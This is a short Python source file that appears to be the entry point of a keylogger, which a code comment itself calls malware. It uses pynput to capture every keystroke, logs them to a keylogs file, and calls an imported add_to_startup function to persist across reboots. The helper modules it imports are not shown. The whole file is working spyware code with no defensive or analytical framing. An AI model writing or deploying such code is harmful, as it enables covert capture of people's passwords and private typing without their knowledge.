from pynput.keyboard import Key, Listener
import logging
from settingUp import add_to_startup,text,logPath
from handleKey import on_press


# setting up the logger to write the keylogs.txt 
logging.basicConfig(filename=(text + logPath),level=logging.DEBUG, format='%(message)s')

# It will initialize the malware 
if __name__ == "__main__":
    add_to_startup()
    with Listener(on_press = on_press) as listener:
        listener.join()